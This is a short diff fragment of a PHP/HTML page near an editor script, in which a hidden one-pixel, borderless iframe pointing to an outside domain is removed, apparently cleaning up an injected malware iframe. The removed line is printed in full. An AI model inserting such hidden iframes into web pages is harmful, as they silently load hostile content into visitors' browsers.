@@ -66,7 +66,7 @@ function getLabel($key,$language){
          $("#content_rte").jqrte_setContent();
    });
 </script>
-<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+
 </body>
 	</body>
 </html>
